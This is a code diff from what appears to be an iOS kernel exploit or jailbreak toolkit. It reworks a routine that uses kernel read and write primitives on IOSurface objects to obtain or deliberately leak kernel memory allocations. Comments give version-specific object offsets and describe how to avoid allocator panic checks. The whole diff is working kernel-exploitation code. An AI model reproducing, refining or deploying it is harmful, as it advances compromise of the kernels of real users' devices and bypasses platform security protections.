@@ -460,24 +460,65 @@ uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
 {
 	if (size > 0x10000) return -1; // 0x10000 is max
 
+	// v88 RMW-law fix (v87 panic 12:37:01, bug_type 210): rangeCount sits at
+	// surface+0x3a4 in the 960-byte iokit.IOSurface element — a primitive
+	// window AT that field ([0x3a4,0x3c4)) overruns the object end (0x3c0)
+	// and trips zalloc.c:1297, and even the FIRST access here is a read
+	// (kread_ptr = 32B RMW window anchored at the field). Every surface
+	// access now goes through ONE window at offRanges, fully inside the
+	// object; leak=true pins the mach port instead of decoupling writes.
+	uint32_t offRanges   = koffsetof(IOSurface, ranges);
+	uint32_t offRangeCnt = koffsetof(IOSurface, rangeCount);
+	if (offRangeCnt < offRanges || (offRangeCnt + 0x4) > (offRanges + 0x20)) {
+		jb_tr_beacon("KALLOC16UP fail,offsets,ranges=%x,cnt=%x", offRanges, offRangeCnt);
+		return 0;
+	}
+	if ((offRanges % 8) != 0 || (offRanges + 0x20) > 960) {
+		jb_tr_beacon("KALLOC16UP fail,window,ranges=%x", offRanges);
+		return 0;
+	}
+	uint32_t cntOffInWin = offRangeCnt - offRanges; // 18.2: 0xc (0x398->0x3a4)
+
 	while (true) {
 		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);
 
 		uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
 		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
-		uint64_t va = IOSurface_get_ranges(surface);
-		uint64_t vaSize = IOSurface_get_rangeCount(surface) * 0x10;
+
+		// ONE law-compliant read window for both fields:
+		// ranges=+0x398, rangeCount=+0x3a4 → window [0x398,0x3b8) ⊆ 960B object.
+		uint8_t win[0x20];
+		if (kreadbuf(surface + offRanges, win, sizeof(win)) != 0) {
+			jb_tr_beacon("KALLOC16UP fail,readwin,surface=%llx", (unsigned long long)surface);
+			mach_port_deallocate(mach_task_self(), surfaceMachPort);
+			continue;
+		}
+		uint64_t va     = UNSIGN_PTR(*(uint64_t *)(win + 0));
+		uint64_t vaSize = (uint64_t)(*(uint32_t *)(win + cntOffInWin)) * 0x10;
 
 		if (vaSize < size) {
 			mach_port_deallocate(mach_task_self(), surfaceMachPort);
 			continue;
 		}
 
-		if (leak) {
-			IOSurface_set_ranges(surface, 0);
-			IOSurface_set_rangeCount(surface, 0);
+		if (!leak) {
+			// Detach the array so the kernel frees it with the surface:
+			// zero ranges+rangeCount via the SAME window (32B fully inside
+			// the 960B object — RMW-law compliant).
+			uint8_t zero[0x20] = {0};
+			if (kwritebuf(surface + offRanges, zero, sizeof(zero)) != 0) {
+				jb_tr_beacon("KALLOC16UP fail,writewin,surface=%llx", (unsigned long long)surface);
+				mach_port_deallocate(mach_task_self(), surfaceMachPort);
+				continue;
+			}
 		}
+		// leak=true: NO object writes at all. The mach port send right is
+		// intentionally never deallocated — the pinned port keeps the
+		// surface (and its 16KB ranges array) alive for the process
+		// lifetime. That IS the leak, without touching rangeCount.
 
+		jb_tr_beacon("KALLOC16UP ok,va=%llx,size=%llx,leak=%d",
+		             (unsigned long long)va, (unsigned long long)vaSize, leak ? 1 : 0);
 		return va;
 	}
 
